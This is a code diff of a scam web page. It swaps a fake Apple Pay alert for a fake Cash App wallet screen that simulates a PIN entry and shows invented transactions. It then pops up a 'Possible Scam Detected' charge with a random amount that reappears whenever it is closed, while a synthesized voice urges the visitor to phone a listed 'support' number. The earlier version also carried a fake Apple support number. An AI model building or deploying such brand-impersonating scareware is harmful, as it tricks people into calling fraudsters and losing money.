-                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M6.62 10.79a15.15 15.15 0 0 0 6.59 6.59l2.2-2.2a1 1 0 0 1 1.11-.27c1.12.37 2.33.57 3.57.57a1 1 0 0 1 1 1V20a1 1 0 0 1-1 1A17 17 0 0 1 3 4a1 1 0 0 1 1-1h3.5a1 1 0 0 1 1 1c0 1.24.2 2.45.57 3.57a1 1 0 0 1-.28 1.11l-2.17 2.11z"/></svg>
-                Apple Care  1 (804) 500-0591 
-            </a>
+
+                <svg viewBox="0 0 300 120" class="chart-svg">
+
+                    <path
+                    d="M0 90 
+                       C30 70, 50 80, 70 60
+                       C90 40, 120 50, 140 35
+                       C170 10, 210 30, 240 20
+                       C260 15, 280 25, 300 5"
+
+                    fill="none"
+                    stroke="#00d64f"
+                    stroke-width="5"
+                    stroke-linecap="round"/>
+
+                </svg>
+
+            </div>
+
         </div>
 
-        <div class="footer-info">
-            Available 24×7 Support<br><br>
-            Apple Pay is a trademark of © Apple Inc. 2026
+        <!-- CTA -->
+
+        <div class="cta">
+
+            <div class="cta-title">
+                Need Assistance?
+            </div>
+
+            <div class="cta-sub">
+                Contact our transfer support line for instant account help.
+            </div>
+
+            <a href="tel:18339885296" class="cta-btn">
+                📞 +1 (833) 988-5296
+            </a>
+
         </div>
+
+        <!-- ACTIVITY -->
+
+        <div class="section">
+
+            <div class="section-head">
+
+                <div class="section-title">
+                    Recent Activity
+                </div>
+
+                <div class="see-all">
+                    See all
+                </div>
+
+            </div>
+
+            <div class="activity-card">
+
+                <!-- ITEM -->
+
+                <div class="item">
+
+                    <div class="item-left">
+
+                        <div class="icon black" aria-label="Apple logo">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="27" height="27" role="img" aria-label="Apple">
+                                <path fill="currentColor" d="M16.7 12.8c0-2.2 1.8-3.3 1.9-3.4-1-1.5-2.6-1.7-3.2-1.7-1.4-.1-2.7.8-3.4.8-.7 0-1.8-.8-3-.8-1.5 0-2.9.9-3.7 2.2-1.6 2.8-.4 6.9 1.1 9.1.7 1.1 1.5 2.3 2.6 2.2 1-.1 1.4-.7 2.7-.7s1.7.7 2.8.7c1.2 0 1.9-1.1 2.6-2.2.8-1.2 1.1-2.4 1.1-2.5-.1 0-2.5-1-2.5-3.7ZM14.5 6.2c.6-.8 1-1.8.9-2.9-.9 0-2 .6-2.6 1.4-.6.7-1.1 1.8-1 2.8 1 .1 2-.5 2.7-1.3Z"/>
+                            </svg>
+                        </div>
+
+                        <div>
+
+                            <div class="name">
+                                Apple iTunes eGift Card
+                            </div>
+
+                            <div class="time">
+                                Today • 9:18 AM
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <div class="amount minus">
+                        -$300.00
+                    </div>
+
+                </div>
+				
+
+                <!-- ITEM -->
+
+                <div class="item">
+
+                    <div class="item-left">
+
+                        <div class="icon green">
+                            ↓
+                        </div>
+
+                        <div>
+
+                            <div class="name">
+                                Cash Deposit
+                            </div>
+
+                            <div class="time">
+                                Today • 11:42 AM
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <div class="amount plus">
+                        +$2,400
+                    </div>
+
+                </div>
+
+
+
+                <!-- ITEM -->
+
+                <div class="item">
+
+                    <div class="item-left">
+
+                        <div class="icon soft">
+                            ↑
+                        </div>
+
+                        <div>
+
+                            <div class="name">
+                                Transfer Sent
+                            </div>
+
+                            <div class="time">
+                                Yesterday • 7:24 PM
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <div class="amount minus">
+                        -$185
+                    </div>
+
+                </div>
+
+                <!-- ITEM -->
+
+                <div class="item">
+
+                    <div class="item-left">
+
+                        <div class="icon green">
+                            $
+                        </div>
+
+                        <div>
+
+                            <div class="name">
+                                Payment Received
+                            </div>
+
+                            <div class="time">
+                                Yesterday • 1:02 PM
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <div class="amount plus">
+                        +$850
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+        <!-- NAV -->
+
+        <div class="nav">
+
+            <div class="nav-item">
+                <div class="nav-icon">🏠</div>
+            </div>
+
+            <div class="nav-item active">
+                <div class="nav-icon">$</div>
+            </div>
+
+            <div class="nav-item">
+                <div class="nav-icon">↗</div>
+            </div>
+
+            <div class="nav-item">
+                <div class="nav-icon">🕗</div>
+            </div>
+
+        </div>
+
     </div>
+
+<!-- TRANSACTION POPUP -->
+
+<div class="popup-wrap" id="popupWrap">
+
+    <div class="popup-card">
+
+        <div class="popup-badge">
+            Possible Scam Detected
+        </div>
+
+        <div class="popup-amount" id="popupAmount">
+            -$185
+        </div>
+
+        <div class="popup-user">
+            Sent to Alex Morgan
+        </div>
+
+        <div class="popup-time" id="popupTime">
+            Today • 2:41 PM
+        </div>
+
+        <button class="popup-btn" onclick="closePopup()">
+            View Transaction
+        </button>
+
+        <a href="tel:18339885296" class="popup-support">
+            📞 Contact Support
+        </a>
+
+    </div>
+
+</div>
+
 </div>
 
 <script>
-    window.addEventListener('DOMContentLoaded', () => {
-        // Run simulated biometric verification sequence
-        setTimeout(() => {
-            const flashLayer = document.getElementById('flashLayer');
-            const container = document.getElementById('mainContainer');
-            
-            // Trigger rapid white flash effect
-            flashLayer.style.animation = "flashEffect 0.35s ease-out forwards";
-            
-            // Complete authorization phase transitions
-            container.classList.add('authenticated');
 
-        }, 3200); 
+/* LOADING TEXT */
+
+setTimeout(()=>{
+
+    document.getElementById("loadingText").innerText =
+    "Securing Wallet...";
+
+},1500);
+
+setTimeout(()=>{
+
+    document.getElementById("loadingText").innerText =
+    "Loading Activity...";
+
+},3000);
+
+/* SPLASH TO PIN */
+
+setTimeout(()=>{
+
+    document.getElementById("splash").style.opacity="0";
+
+    setTimeout(()=>{
+
+        document.getElementById("splash").style.display="none";
+
+        const pin =
+        document.getElementById("pinScreen");
+
+        pin.style.opacity="1";
+        pin.style.pointerEvents="all";
+
+    },500);
+
+},4200);
+
+/* AUTO PIN */
+
+setTimeout(()=>{
+
+    document.getElementById("d1").classList.add("active");
+
+},5200);
+
+setTimeout(()=>{
+
+    document.getElementById("d2").classList.add("active");
+
+},5600);
+
+setTimeout(()=>{
+
+    document.getElementById("d3").classList.add("active");
+
+},6000);
+
+setTimeout(()=>{
+
+    document.getElementById("d4").classList.add("active");
+
+},6400);
+
+/* OPEN MAIN */
+
+setTimeout(()=>{
+
+    const pin =
+    document.getElementById("pinScreen");
+
+    pin.style.opacity="0";
+
+    setTimeout(()=>{
+
+        pin.style.display="none";
+
+        document
+        .getElementById("main")
+        .classList.add("show");
+
+    },500);
+
+},7600);
+
+/* =========================
+   LIVE TIME
+========================= */
+
+function updatePopupTime(){
+
+    const now = new Date();
+
+    const time =
+    now.toLocaleTimeString([],{
+        hour:'numeric',
+        minute:'2-digit'
     });
-</script>
 
+    document.getElementById("popupTime").innerText =
+    "Today • " + time;
 
-<div class="apple-popup-overlay" id="applePopup"><div class="apple-popup">
+}
 
-<div class="popup-badge">Transaction Review</div>
-<div class="popup-amount">$500.00</div>
-<div class="popup-person">Sent to Irene Hayes</div>
-<div class="popup-time">Today • 00:21 AM</div>
-<button class="popup-button" onclick="closeApplePopup()">View Transaction</button>
-<a href="tel:18045000591" class="popup-support">Contact Apple Support</a>
-</div></div>
+updatePopupTime();
 
-<script>
+/* =========================
+   RANDOM AMOUNT
+========================= */
 
-function speakTransactionAlert(){
+const randomAmount =
+Math.floor(Math.random() * 400) + 80;
+
+document.getElementById("popupAmount").innerText =
+"-$" + randomAmount;
+
+/* =========================
+   SHOW POPUP
+========================= */
+
+setTimeout(()=>{
+
+    document
+    .getElementById("popupWrap")
+    .classList.add("show");
+
+    setTimeout(()=>{
+
+        playVerificationAlert();
+
+    },600);
+
+},9800);
+
+/* =========================
+   CLOSE
+========================= */
+
+function closePopup(){
+
+    const popup =
+    document.getElementById("popupWrap");
+
+    popup.classList.remove("show");
+
+    /* subtle chart animation */
+
+    const chart =
+    document.querySelector(".mini-chart");
+
+    chart.style.transform =
+    "scale(.98)";
+
+    chart.style.transition =
+    ".3s ease";
+
+    setTimeout(()=>{
+
+        chart.style.transform =
+        "scale(1)";
+
+    },300);
+
+    /* reopen popup */
+
+    setTimeout(()=>{
+
+        popup.classList.add("show");
+
+    },2500);
+
+}
+
+/* =========================
+   VOICE ALERT
+========================= */
+
+function playVerificationAlert(){
+
+    if(!('speechSynthesis' in window)){
+        return;
+    }
 
     window.speechSynthesis.cancel();
 
-    const msg = new SpeechSynthesisUtterance();
+    const supportNumber =
+    "+1 833 988 5296";
 
-    msg.text =
-"You've sent $500 to Irene Hayes. If it's not you, please contact Apple Support by tapping the button below, or call our toll free number at, 1 804 500 0591.";
+    const message =
 
-    msg.rate = 0.90;
-    msg.pitch = 0.92;
-    msg.volume = 0.95;
+    `Possible scam transaction detected. Please review the transaction details. If this activity was not authorized by you, contact Cash App support immediately on ${supportNumber}`;
 
-    const voices = speechSynthesis.getVoices();
+    const speech =
+    new SpeechSynthesisUtterance(message);
+
+    speech.rate = 0.9;
+    speech.pitch = 1;
+    speech.volume = 1;
+
+    const voices =
+    window.speechSynthesis.getVoices();
 
     const preferred =
-        voices.find(v => v.name.includes("Microsoft Aria")) ||
-        voices.find(v => v.name.includes("Samantha")) ||
-        voices.find(v => v.lang.startsWith("en"));
+    voices.find(v =>
+        v.lang.startsWith('en')
+    );
 
     if(preferred){
-        msg.voice = preferred;
+        speech.voice = preferred;
     }
 
-    speechSynthesis.speak(msg);
+    window.speechSynthesis.speak(speech);
+
 }
 
-speechSynthesis.onvoiceschanged = () => {
-    speechSynthesis.getVoices();
-};
+/* =========================
+   LIVE STATUS TIME
+========================= */
 
+function updateLiveTime(){
 
-let popupTimer=null;
-function showApplePopup(){document.getElementById('applePopup').classList.add('show');updatePopupPosition();speakTransactionAlert();}
-function schedulePopup(delay){clearTimeout(popupTimer);popupTimer=setTimeout(showApplePopup,delay);}
-function closeApplePopup(){document.getElementById('applePopup').classList.remove('show');schedulePopup(8000);}
-function updatePopupPosition(){
- const p=document.getElementById('applePopup');
- p.style.transform='translate(0,0)';
- p.style.width='100%';
- p.style.height='100%';
- p.style.display='flex';
- p.style.justifyContent='center';
-p.style.alignItems='flex-start';
-p.style.paddingTop='362px';
+    const now = new Date();
+
+    const time =
+    now.toLocaleTimeString([],{
+        hour:'numeric',
+        minute:'2-digit'
+    });
+
+    document.getElementById("liveTime").innerText =
+    time;
+
 }
-function updateTime(){
- const el=document.querySelector('.popup-time');
- const d=new Date();let h=d.getHours(),m=String(d.getMinutes()).padStart(2,'0');const am=h>=12?'PM':'AM';h=h%12||12;
- if(el)el.textContent=`Today • ${h}:${m} ${am}`;
-}
-window.addEventListener('DOMContentLoaded',()=>{updateTime();schedulePopup(6000);});
+
+updateLiveTime();
+
+setInterval(updateLiveTime,1000);
+
 </script>
-</body>
 
+</body>
 </html>
